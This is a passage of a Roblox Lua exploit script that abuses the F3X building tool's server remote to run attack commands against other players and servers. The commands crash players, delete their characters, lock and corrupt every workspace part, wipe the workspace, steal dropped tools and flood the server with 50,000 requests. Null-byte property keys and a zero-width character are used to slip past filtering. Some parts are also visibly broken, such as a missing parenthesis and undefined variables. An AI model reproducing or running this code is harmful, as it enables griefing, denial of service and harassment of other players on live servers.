            }
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = workspace:FindFirstChild("2-a9885cad2cd5400590b1e85d8ac8ecd2"),
            ["Surfaces"] = {
                ["Position\0"] = Vector3.new(root.Position.X, root.Position.Y, root.Position.Z),
                ["Anchored\0"] = false
            }
        }
    }
}

game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "UndoRemove",
    [2] = {
        [1] = workspace:FindFirstChild("2-d29f7651bfe34b2b94cdc107f86caac4")
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    bring(Target)
end end)
cb("re", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
    local function refresh(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
        Delete(Target.Character, Tool)
        Delete(Target.Character, Tool)
            end
    if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
        end
refresh(Target)
end end)
cb("crash", function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
    local root = game.Players.LocalPlayer.Character.HumanoidRootPart
    local function bring(Target)
        local Tool = GetPath()
        if not Tool then return end
        local function Task()
local args = {
    [1] = "CreatePart",
    [2] = "Wedge",
    [3] = CFrame.new(Target.Character.HumanoidRootPart.Position.X, Target.Character.HumanoidRootPart.Position.Y, Target.Character.HumanoidRootPart.Position.Z) * CFrame.Angles(-0, 0, -0)
}

game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "CreateWelds",
    [2] = {
        [1] = workspace.Wedge
    },
    [3] = Target.Character.HumanoidRootPart
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = Workspace.Wedge,
            ["Surfaces"] = {
                ["Transparency\0"] = 1,
                ["CanCollide\0"] = false,
                ["Position\0"] = Vector3.new(30.2099876, 2.80000806, -34.4999962),
                ["Name\0."] = "2-d29f7651bfe34b2b94cdc107f86caac4"
                --["Locked\0."] = true
            }
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = Workspace:FindFirstChild("2-d29f7651bfe34b2b94cdc107f86caac4"),
            ["Surfaces"] = {
                ["Anchored\0"] = true
            }
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = workspace:FindFirstChild("2-a9885cad2cd5400590b1e85d8ac8ecd2"),
            ["Surfaces"] = {
                ["Position\0"] = Vector3.new(30.2099876, 2.80000806, -34.4999962),
                ["Anchored\0"] = false
            }
        }
    }
}

game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local args = {
    [1] = "UndoRemove",
    [2] = {
        [1] = workspace:FindFirstChild("2-d29f7651bfe34b2b94cdc107f86caac4")
    }
}

game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
        end
        if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
    bring(Target)
end 
end)
cb("clone", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
local Tool = GetPath()
local function Task()
Delete(Target.Character.Torso.Neck, Tool)
for i = 1,8 do
        Delete(Target.Character, Tool)
        Delete(Target.Character, Tool) wait()
        end
        end
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
end)
cb("reanim", function()
--/ Prerequisite
local far = CFrame.new(0, 1000000, 0)
local Player = game:GetService("Players").LocalPlayer
local realchar = Player.Character
local char = Instance.new("Model", workspace)
char.Name = "LPI - Reanimate"
local humanoid = realchar:FindFirstChildOfClass("Humanoid")
local hrp = realchar:FindFirstChild("HumanoidRootPart")

local F3X = Player.Backpack:FindFirstChild("F3X") or
	Player.Character:FindFirstChild("F3X")
humanoid:EquipTool(F3X)

--/ Primitive SyncAPI calls
local SyncAPI = F3X["SyncAPl"]["ServerEndPoint"..utf8.char(0x200C)] or F3X["SyncAPl"]["ServerEndPoint"]
local Prim = {}
Prim.CreatePart = function(cframe: CFrame): Part
	return SyncAPI:InvokeServer("CreatePart", "Normal", cframe)
end
Prim.DestroyParts = function(part: BasePart)
	SyncAPI:InvokeServer("UndoRemove", part)
end
Prim.Weld = function(part1: BasePart, part2: BasePart): {Weld}
	return SyncAPI:InvokeServer("CreateWelds", {part2}, part1)
end
Prim.CreateMeshes = function(parts: {BasePart}): {SpecialMesh}
	local t = {}
	for _, v in parts do
		table.insert(t, {Part = v})
	end
	return SyncAPI:InvokeServer("CreateMeshes", t)
end

--/ Setup
local limb = {
	HumanoidRootPart = realchar["HumanoidRootPart"].CFrame,
	Torso = realchar["Torso"].CFrame,
	Head = realchar["Head"].CFrame,
	RightArm = realchar["Right Arm"].CFrame,
	RightLeg = realchar["Right Leg"].CFrame,
	LeftArm = realchar["Left Arm"].CFrame,
	LeftLeg = realchar["Left Leg"].CFrame
}
hrp.CFrame = far
task.wait()
local welded = Prim.CreatePart(far)
local welds = Prim.Weld(hrp, welded)
for _, weld in welds do
	-- this is clientside!
	-- which means your real characters position wont replicate
	-- on server, you will stay welded and won't move, only the
	-- fake character will move.
	weld:Destroy()
end
task.wait()
hrp.CFrame = limb.HumanoidRootPart

local Torso = Prim.CreatePart(limb.Torso)
local Head = Prim.CreatePart(limb.Head)
local RightArm = Prim.CreatePart(limb.RightArm)
local RightLeg = Prim.CreatePart(limb.RightLeg)
local LeftArm = Prim.CreatePart(limb.LeftArm)
local LeftLeg = Prim.CreatePart(limb.LeftLeg)
Torso.Parent = char; Torso.Name = "Torso"; Torso.BrickColor = BrickColor.new("Bright red")
Head.Parent = char; Head.Name = "Head"; Head.BrickColor = BrickColor.new("Institutional white")
RightArm.Parent = char; RightArm.Name = "Right Arm"; RightArm.BrickColor = BrickColor.new("Really red")
RightLeg.Parent = char; RightLeg.Name = "Right Leg"; RightLeg.BrickColor = BrickColor.new("Really red")
LeftArm.Parent = char; LeftArm.Name = "Left Arm"; LeftArm.BrickColor = BrickColor.new("Really red")
LeftLeg.Parent = char; LeftLeg.Name = "Left Leg"; LeftLeg.BrickColor = BrickColor.new("Really red")

for _, v0 in realchar:GetDescendants() do
	if v0:IsA("BasePart") then
		for _, v1 in char:GetDescendants() do
			if v1:IsA("BasePart") then
				local ncc = Instance.new("NoCollisionConstraint", Torso)
				ncc.Part0 = v0
				ncc.Part1 = v1
				ncc.Name = `{v0.Name} - {v1.Name}`
				v1.CanCollide = false
			end
		end
		v0.CanCollide = false
	end
end

local Limbs = {
	Torso, Head, RightArm, RightLeg, LeftArm, LeftLeg
}

local meshes = Prim.CreateMeshes(Limbs)
SyncAPI:InvokeServer("SyncMesh", { -- easier to do with a direct sync call
	{
		MeshType = Enum.MeshType.FileMesh,
		MeshId = "https://www.roblox.com/asset/?id=82907945",
		Part = Torso
	},
	{
		MeshType = Enum.MeshType.FileMesh,
		MeshId = "https://www.roblox.com/asset/?id=5560742556",
		Part = Head
	},
	{
		MeshType = Enum.MeshType.FileMesh,
		MeshId = "https://www.roblox.com/asset/?id=82908019",
		Part = RightArm
	},
	{
		MeshType = Enum.MeshType.FileMesh,
		MeshId = "https://www.roblox.com/asset/?id=81487710",
		Part = RightLeg
	},
	{
		MeshType = Enum.MeshType.FileMesh,
		MeshId = "https://www.roblox.com/asset/?id=82907977",
		Part = LeftArm
	},
	{
		MeshType = Enum.MeshType.FileMesh,
		MeshId = "https://www.roblox.com/asset/?id=81487640",
		Part = LeftLeg
	}
})
SyncAPI:InvokeServer("CreateTextures", {{Part = Head, TextureType = "Decal", Face = Enum.NormalId.Front}})
SyncAPI:InvokeServer("SyncTexture", {{Part = Head, TextureType = "Decal", Face = Enum.NormalId.Front, Texture = "rbxassetid://2492950480"}})

--/ Replication
Prim.SyncPos = function(parts: {BasePart})
	local t = {}
	for _, p in parts do
		if p.Locked then continue end
		table.insert(t, {
			Part = p,
			Surfaces = {
				["CFrame\0"] = realchar[p.Name].CFrame,
				["Size\0"] = realchar[p.Name].Size,
				["Color\0"] = Color3.new(0, 0, math.random() * 0.3),
				["Anchored\0"] = true,
				["CanCollide\0"] = p.Name == "Torso",
				["CanTouch\0"] = false,
				["AssemblyLinearVelocity\0"] = Vector3.one * math.random(50000, 10000000)
			}
		})
	end
	SyncAPI:InvokeServer("SyncSurface", t)
end

Prim.DestroyParts({F3X.Handle})
for i, v in realchar:GetDescendants() do
	if v:IsA("BasePart") or v:IsA("Decal") then
		v.Transparency = 1
	end
end

local function sync()
	Prim.SyncPos(Limbs)
end

local connection = game:GetService("RunService").Heartbeat:Connect(sync)

humanoid.Died:Connect(function()
	connection:Disconnect()
	local td = Limbs
	table.insert(td, welded)
	Prim.DestroyParts(td)
	char:Destroy()
end)
end)
cb("lock", function()
local function lock(Target)
local Tool = GetPath()
local function trask(instance, tool)
        local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = instance,
            ["Surfaces"] = {
            ["Locked\0."] = true
            }
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
    end
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            trask(Target, Tool)
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            trask(Target, Tool)
        end end
local lp = game:GetService("Players").LocalPlayer
local del = Instance.new("Tool")
del.Name = "lock"
del.TextureId = "0"
local m = lp:GetMouse()
local con = {}
local sb = Instance.new("SelectionBox")
local spl = Instance.new("SelectionPartLasso")
local b1p
local mov
del.Equipped:Connect(function()
	sb.Parent = workspace
	spl.Parent = workspace
	sb.Color = BrickColor.new("Bright red")
	spl.Color = BrickColor.new("Bright red")
	mov = m.Move:Connect(function()
		if m.Target and m.Target:IsA("BasePart") and not m.Target:IsDescendantOf(lp.Character) then
			sb.Adornee = m.Target
			spl.Part = m.Target
		end
	end)
	b1p = m.Button1Up:Connect(function()
		if m.Target and m.Target:IsA("BasePart") and not m.Target:IsDescendantOf(lp.Character) then
			lock(m)
		end
		local del = Instance.new("Tool")
del.Name = "Delete"
del.TextureId = "rbxasset://Textures/Hammer.png"
local m = lp:GetMouse()
local con = {}
local sb = Instance.new("SelectionBox")
local spl = Instance.new("SelectionPartLasso")
local b1p
local mov
del.Equipped:Connect(function()
	sb.Parent = workspace
	spl.Parent = workspace
	sb.Color = BrickColor.new("Bright red")
	spl.Color = BrickColor.new("Bright red")
	mov = m.Move:Connect(function()
		if m.Target and m.Target:IsA("BasePart") and not m.Target:IsDescendantOf(lp.Character) then
			sb.Adornee = m.Target
			spl.Part = m.Target
		end
	end)
	b1p = m.Button1Up:Connect(function()
		if m.Target and m.Target:IsA("BasePart") and not m.Target:IsDescendantOf(lp.Character) then
			lock(m)
		end
				local del = Instance.new("Tool")
				del.Name = "Delete"
				del.TextureId = "rbxasset://Textures/Hammer.png"
				local m = lp:GetMouse()
				local con = {}
				local sb = Instance.new("SelectionBox")
				local spl = Instance.new("SelectionPartLasso")
				local b1p
				local mov
				del.Equipped:Connect(function()
					sb.Parent = workspace
					spl.Parent = workspace
					sb.Color = BrickColor.new("Bright red")
					spl.Color = BrickColor.new("Bright red")
					mov = m.Move:Connect(function()
						if m.Target and m.Target:IsA("BasePart") and not m.Target:IsDescendantOf(lp.Character) then
							sb.Adornee = m.Target
							spl.Part = m.Target
						end
					end)
					b1p = m.Button1Up:Connect(function()
						if m.Target and m.Target:IsA("BasePart") and not m.Target:IsDescendantOf(lp.Character) then
							lock(m)
						end
					end)
				end)
				del.Unequipped:Connect(function()
					sb.Parent = nil
					spl.Parent = nil
					sb.Adornee = nil
					spl.Part = nil
					b1p:Disconnect()
					mov:Disconnect()
				end)
				del.RequiresHandle = false
				del.Parent = lp.Backpack
	end)
end)
del.Unequipped:Connect(function()
	sb.Parent = nil
	spl.Parent = nil
	sb.Adornee = nil
	spl.Part = nil
	b1p:Disconnect()
	mov:Disconnect()
end)
del.RequiresHandle = false
del.Parent = lp.Backpack
	end)
end)
del.Unequipped:Connect(function()
	sb.Parent = nil
	spl.Parent = nil
	sb.Adornee = nil
	spl.Part = nil
	b1p:Disconnect()
	mov:Disconnect()
end)
del.RequiresHandle = false
del.Parent = lp.Backpack
end)
cb("corruption", function()
local function Task()
for i, v in pairs(Workspace:GetChildren()) do 
if v:IsA("BasePart") and not v.Locked then
local args = {
    [1] = "SyncSurface",
    [2] = {
        [1] = {
            ["Part"] = v,
            ["Surfaces"] = {
            ["Locked\0."] = true,
            ["Name\0."] = "part has fucked up - corrupted 100%",
            ["AssemblyLinearVelocity\0"] = Vector3.one * math.random(48484838483838383883838383850000, 48484838483838383883838383810000000) 
            }
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
end end end
local Tool = GetPath()
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
end
end)
cb("clearws", function()
local players = game:GetService("Players")
            local Tool = GetPath()
            if not Tool then return end
            local function Task()
                for i,v in pairs(workspace:GetChildren()) do
		if players:GetPlayerFromCharacter(v) then continue end
		Delete(v, Tool)
	end
            end
            if Tool.Parent == backpack then
                Tool.Parent = character
                task.wait(0.8)
                Task()
                task.wait(0.1)
                Tool.Parent = backpack
            elseif Tool.Parent == character then
                Task()
            end
end)
cb("import", function()
local assetId = ""..args[2]
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local humanoid = LocalPlayer:FindFirstChildOfClass("Humanoid")
local BuildingTools = LocalPlayer.Character:FindFirstChild("F3X") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild('F3X')
local SyncAPI = BuildingTools:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction")
local function Task()
-- Function to create a part of a specific type
local function createPart(PartType, CFrame)
    local part = SyncAPI:InvokeServer("CreatePart", PartType, CFrame, workspace)
    repeat wait() until workspace:FindFirstChild(part.Name)
    return part
end

-- Function to resize a part
local function resize(Part, Size, CFrame)
    SyncAPI:InvokeServer("SyncResize", {
        {
            ["Part"] = Part,
            ["CFrame"] = CFrame,
            ["Size"] = Size
        }
    })
end

-- Function to change part color
local function color(Part, Color)
    SyncAPI:InvokeServer("SyncColor", {
        {
            ["Part"] = Part,
            ["UnionColoring"] = true,
            ["Color"] = Color
        }
    })
end

-- Function to change part material
local function material(Part, Material)
    SyncAPI:InvokeServer("SyncMaterial", {
        {
            ["Part"] = Part,
            ["Material"] = Material
        }
    })
end

-- Function to set collision
local function collision(Part, bool)
    SyncAPI:InvokeServer("SyncCollision", {
        {
            ["Part"] = Part,
            ["CanCollide"] = bool
        }
    })
end

-- Function to add a mesh
local function addMesh(Part, MeshId, TextureId)
    if not MeshId or MeshId == "" then return end
    SyncAPI:InvokeServer("CreateMeshes", {
        {
            ["Part"] = Part
        }
    })
    SyncAPI:InvokeServer("SyncMesh", {
        {
            ["MeshType"] = Enum.MeshType.FileMesh,
            ["Part"] = Part,
            ["MeshId"] = MeshId,
            ["TextureId"] = TextureId
        }
    })
end

-- Function to set transparency
local function setTransparency(Part, TransparencyLevel)
    SyncAPI:InvokeServer("SyncMaterial", {
        {
            ["Part"] = Part,
            ["Transparency"] = TransparencyLevel
        }
    })
end

-- Function to set reflectance
local function setReflectance(Part, ReflectanceLevel)
    SyncAPI:InvokeServer("SyncMaterial", {
        {
            ["Part"] = Part,
            ["Reflectance"] = ReflectanceLevel
        }
    })
end

-- Function to add a texture or decal
local function addTexture(Part, Face, TextureType)
    SyncAPI:InvokeServer("CreateTextures", {
        {
            ["Part"] = Part,
            ["Face"] = Face,
            ["TextureType"] = TextureType
        }
    })
end

-- Function to add a light
local function addLight(Part, LightType)
    SyncAPI:InvokeServer("CreateLights", {
        {
            ["Part"] = Part,
            ["LightType"] = LightType
        }
    })
end
local function Locked(Part, bool)
SyncAPI:InvokeServer("SyncSurface", {
{
            ["Part"] = part,
            ["Surfaces"] = {
            ["Locked\0."] = bool,
            }
        }
    })
end
-- Function to determine part type
local function determinePartType(part)
    if part:IsA("TrussPart") then
        return "Truss"
    elseif part:IsA("WedgePart") then
        return "Wedge"
    elseif part:IsA("CornerWedgePart") then
        return "Corner"
    elseif part:IsA("Cylinder") then
        return "Cylinder"
    elseif part:IsA("Ball") then
        return "Ball"
    elseif part:IsA("Seat") then
        return "Seat"
    elseif part:IsA("VehicleSeat") then
        return "VehicleSeat"
    elseif part:IsA("SpawnLocation") then
        return "Spawn"
    else
        return "Normal"
    end
end

-- Function to process and build parts
local function buildPart(part)
    if not part:IsA("BasePart") then return end

    local partType = determinePartType(part)
    local newPart = createPart(partType, part.CFrame)

    color(newPart, part.Color)
    resize(newPart, part.Size, part.CFrame)
    material(newPart, part.Material)
    collision(newPart, part.CanCollide)
    setTransparency(newPart, part.Transparency) -- Apply transparency
    setReflectance(newPart, part.Reflectance)   -- Apply reflectance

    -- Add textures and decals (Example: Front face as placeholder)
    addTexture(newPart, Enum.NormalId.Front, "Texture")
    addTexture(newPart, Enum.NormalId.Front, "Decal")
    Locked(newPart, part.Locked
    
    -- Add lights to the part (Example: Adding PointLight)
    addLight(newPart, SpotLight) -- Replace with "SpotLight" or "SurfaceLight" if needed

    if part.Anchored then
        SyncAPI:InvokeServer("SyncAnchor", {
            {
                ["Part"] = newPart,
                ["Anchored"] = true
            }
        })
    end

    if part:IsA("MeshPart") then
        addMesh(newPart, part.MeshId, part.TextureId)
    end
end

-- Load the model
-- assetId = nil -- Replace with the rbxassetid of the model
local model = game:GetObjects("rbxassetid://" .. assetId)[1]
if not model then
    warn("Failed to load model from asset ID.")
    return
end

model.Parent = workspace

-- Process parts in parallel
local threads = {}
for _, descendant in ipairs(model:GetDescendants()) do
    table.insert(threads, coroutine.create(function()
        buildPart(descendant)
    end))
end

-- Start all threads
for _, thread in ipairs(threads) do
    coroutine.resume(thread)
end

model:Destroy()

-- Notify the user
print("Model built and original model removed successfully!")
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Built!",
    Text = "Model built and original model removed successfully!",
    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=180&h=180 true",
    Duration = 5
})
end
local Tool = GetPath()
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
        elseif Tool.Parent == player.Character then
            Task()
        end
end)
cb("amputate", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
local Tool = GetPath()
local function Task()
        Delete(Target.Character, Tool)
        for i,v in pairs(Target.Character.Torso:GetChildren()) do
        Delete(v, Tool)
        end
        Delete(Target.Character, Tool) wait()
        end
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
end)
cb("fakechar", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
local Tool = GetPath()
local SyncAPI = tool:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction")
local Prim = {}
Prim.CreatePart = function(cframe: CFrame): Part
	return SyncAPI:InvokeServer("CreatePart", "Normal", cframe)
end
Prim.Name = function(part, name) SyncAPI:InvokeServer("SyncSurface", {part}, {name})
end
Prim.Anchored = function(part, Anchored) SyncAPI:InvokeServer("SyncSurface", {part}, {Anchored})
end
Prim.Weld = function(part1: BasePart, part2: BasePart): {Weld}
	return SyncAPI:InvokeServer("CreateWelds", {part2}, part1)
end
local realchar = Target.Character
local limb = {
	HumanoidRootPart = realchar["HumanoidRootPart"].CFrame,
	Torso = realchar["Torso"].CFrame,
	Head = realchar["Head"].CFrame,
	RightArm = realchar["Right Arm"].CFrame,
	RightLeg = realchar["Right Leg"].CFrame,
	LeftArm = realchar["Left Arm"].CFrame,
	LeftLeg = realchar["Left Leg"].CFrame
}
local function Task()
    for i,v in pairs(limb) do 
local limb = Prim.CreatePart(v)
end
local pair = { HumanoidRootPart, Torso, Head, RightArm,RightLeg,LeftArm,LeftLeg}
for i,v in pairs(pair) do
Prim.Name(v, v.Name) -- Error attempted to index nil with Cframe
Prim.Weld(v.Name, Target.Character.HumanoidRootPart)
prim.Anchored(v.Name, false)
end
Delete(Target.Character.Humanoid, Tool)
        for i,v in pairs(Target.Character:GetChildren()) do
        if v == "HumanoidRootPart" or v == "Humanoid" then
            Delete(v, Tool)
        end
        end
    Delete(Target.Character.Humanoid, Tool)
        end
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
end)
cb("hatcrash", function()
local Tool = GetPath()
local function Task()
local args = {
    [1] = "\195\154\196\128\195\181\195\170\195\148\195\182\195\189\195\172",
    [2] = {
        [1] = {
            ["Part"] = workspace["ROBLOX MODEL"][""].Hat,
            ["CFrame"] = CFrame.new(0,4,0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        }
    }
}
game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args))
local function badbad()
for i = 1,10000 do
local args = {
    [1] = "\195\138\195\179\195\182\195\181\195\172",
    [2] = {
        [1] = workspace["ROBLOX MODEL"][""].Hat
    }
}

game:GetService("Players").LocalPlayer.Character.F3X:FindFirstChildOfClass("BindableFunction"):FindFirstChildOfClass("RemoteFunction"):InvokeServer(unpack(args)) end end
for i = 1,5 do badbad() end
        end
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
end)
--[[game:GetService("MarketplaceService"):GetProductInfo(SoundId)]]
cb("touch", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
local vChar = Target.Character
local plr = game.Players.LocalPlayer
local chr = plr.Character
local pos = chr.HumanoidRootPart.CFrame
local hrp = chr:WaitForChild("HumanoidRootPart")
local Default = workspace["Sp bricks"]["Sp bricks"].CharacterSizeChanger.Default.TouchInterest
local small = workspace["Sp bricks"]["Sp bricks"].CharacterSizeChanger.Big.TouchInterest
local function unsize()
firetouchinterest(hrp, small, 0)
    firetouchinterest(hrp, Default, 0)
    firetouchinterest(hrp, small, 1)
    firetouchinterest(hrp, Default, 1)
end
gear(22787248, 1)
repeat wait() until plr.Backpack:FindFirstChild("Watermelon")
local melon = plr.Backpack:FindFirstChild("Watermelon")
melon.Parent = chr
melon.GripPos = Vector3.new(2,-0.5,1.5)
wait()
for i = 1,4 do
unsize()
end
wait(0.2)
melon.Parent=workspace
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://178130996"
local k = chr.Humanoid:LoadAnimation(anim)
k:Play()
repeat game:GetService("RunService").RenderStepped:Wait() chr.HumanoidRootPart.CFrame=vChar.HumanoidRootPart.CFrame*CFrame.new(-1,1.5,4) until vChar:FindFirstChild("Watermelon")
k:Stop()
chr.HumanoidRootPart.CFrame = pos
end end)
cb("break", function()
for _Index, Target in pairs(GetPlayer(args[2])) do
local Tool = GetPath()
local function Task()
        Delete(Target.Character.HumanoidRootPart, Tool)
        Delete(Target.Character, Tool)
        Delete(Target.Character, Tool) wait()
        end
if Tool.Parent == player.Backpack then
            Tool.Parent = player.Character
            task.wait(0.8)
            Task()
            task.wait(0.1)
            Tool.Parent = player.Backpack
        elseif Tool.Parent == player.Character then
            Task()
        end
    end
end)
cb("drop", function()
local player = game.Players.LocalPlayer
local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
local function Task(Target, Tool)
    print(1)
    Delete(Target.Character.Head, Tool)
    Delete(Target.Character.Humanoid, Tool)
    
    repeat task.wait() until not Target.Character:FindFirstChildOfClass("Humanoid")
    print(2)
    
    if Target.Character then
        for _, v in ipairs(Target.Character:GetChildren()) do
            if v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
                v.Parent = player.Character
            end
        end
        print(3)
    end
end

for _Index, Target in pairs(GetPlayer(args[2])) do
    local Tool = GetPath()
    
    if Tool.Parent == player.Backpack then
        Tool.Parent = player.Character
        task.wait(0.8)
        Task(Target, Tool)
        task.wait(0.1)
        Tool.Parent = player.Backpack
    elseif Tool.Parent == player.Character then
        Task(Target, Tool)
    end
end
end)
local starttime2 = os.clock()
local diff_seconds = starttime2 - starttime1
local formatted_time = string.format("%.1f", diff_seconds)
game.TextChatService.TextChannels.RBXSystem:DisplaySystemMessage("<font color=\"rgb(255, 0, 0)\">Loaded successful in ms:" .. formatted_time .. "</font>")
game.TextChatService.TextChannels.RBXSystem:DisplaySystemMessage("<font color=\"rgb(23, 252, 3)\">Use cmds to view every command.</font>")

